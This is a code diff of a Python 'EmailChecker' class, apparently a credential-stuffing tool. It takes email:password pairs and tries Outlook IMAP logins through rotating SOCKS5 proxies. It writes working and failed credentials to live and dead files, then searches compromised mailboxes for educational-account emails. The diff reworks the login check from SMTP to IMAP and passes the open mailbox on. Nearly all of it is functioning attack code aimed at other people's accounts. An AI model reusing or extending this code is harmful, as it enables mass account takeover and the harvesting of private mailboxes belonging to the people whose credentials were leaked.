@@ -87,37 +87,7 @@ class EmailChecker:
         password = 1
         return address, port, username, password
 
-    def check_login(self, subject, body, to_email, sender_email, sender_password):
-        try:
-            message = f"Subject: {subject}\n\n{body}"
-            smtp_server = "smtp-mail.outlook.com"
-            smtp_port = 587
-            # smtp_server = "outlook.office365.com"
-            # smtp_port = 993
-            if self.proxy:
-                address, port, username, password = self.get_random_proxy()
-                auth_methods = [
-                    sockslib.UserPassAuth(username,
-                                          password),
-                ]
-                sockslib.set_default_proxy((address, port), sockslib.Socks.SOCKS5)
-                socket.socket = sockslib.SocksSocket
-            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
-            server.starttls()
-            server.login(sender_email, sender_password)
-            server.sendmail(sender_email, to_email, message)
-            server.quit()
-            return None
-        except smtplib.SMTPAuthenticationError as e:
-            error_message = f"Authentication failed. {str(e)}"
-            return error_message
-        except Exception as e:
-            error_message = f"{str(e)}"
-            return error_message
-
-    def check_edu_mailbox(self, email_address, password, max_check_time):
-        start_time = datetime.now()
-        mail_count = 0
+    def check_login(self, email_address, email_password):
         try:
             imap_server = "outlook.office365.com"
             imap_port = 993
@@ -131,7 +101,19 @@ class EmailChecker:
                 sockslib.set_default_proxy((address, port), sockslib.Socks.SOCKS5)
                 socket.socket = sockslib.SocksSocket
             mail = imaplib.IMAP4_SSL(imap_server, imap_port)
-            mail.login(email_address, password)
+            mail.login(email_address, email_password)
+            return mail, None
+        except smtplib.SMTPAuthenticationError as e:
+            error_message = f"Authentication failed. {str(e)}"
+            return None, error_message
+        except Exception as e:
+            error_message = f"{str(e)}"
+            return None, error_message
+
+    def check_edu_mailbox(self, email_address, password, mail, max_check_time):
+        start_time = datetime.now()
+        mail_count = 0
+        try:
             log_message(f"{email_address} : {password} -> EDU Email Login", color=Fore.LIGHTBLUE_EX,
                         enable=int(log_level) - 1)
 
@@ -189,25 +171,23 @@ class EmailChecker:
 
     def check_mailbox(self, email_pwd, max_check_time=300):
         e = str(email_pwd).split(':')
-        c = self.check_login('Checking...', 'Checking...', e[0], e[0], e[1])
-
-        if c is None:
+        mail, message = self.check_login(e[0], e[1])
+        if mail is None:
+            with open(dead_emails_dir, 'a') as file:
+                file.write(email_pwd + '\n')
+            log_message(f"{e[0]} : {e[1]} -> {message}", color=Fore.WHITE, enable=int(log_level) - 2)
+            self.dead_count += 1
+        else:
             self.live_count += 1
             with open(live_emails_dir, 'a') as file:
                 file.write(email_pwd + '\n')
                 log_message(f"{e[0]} : {e[1]} -> Login Success", color=Fore.LIGHTBLUE_EX)
-            if self.check_edu_mailbox(e[0], e[1], max_check_time):
+            if self.check_edu_mailbox(e[0], e[1], mail, max_check_time):
                 with open(edu_emails_dir, 'a') as file:
                     file.write(email_pwd + '\n')
                 log_message(f"{e[0]} : {e[1]} -> EDU Email Found", color=Fore.LIGHTGREEN_EX)
                 self.edu_count += 1
                 return
-        else:
-            with open(dead_emails_dir, 'a') as file:
-                file.write(email_pwd + '\n')
-            log_message(f"{e[0]} : {e[1]} -> {c}", color=Fore.WHITE, enable=int(log_level) - 2)
-            self.dead_count += 1
-        return
 
     def collect_and_send_stats(self):
         # 检查了xx邮箱 有xx个活着的邮箱 有xx个死掉的邮箱 有xx个edu邮箱 检索了xx 封邮件 用时xx分钟
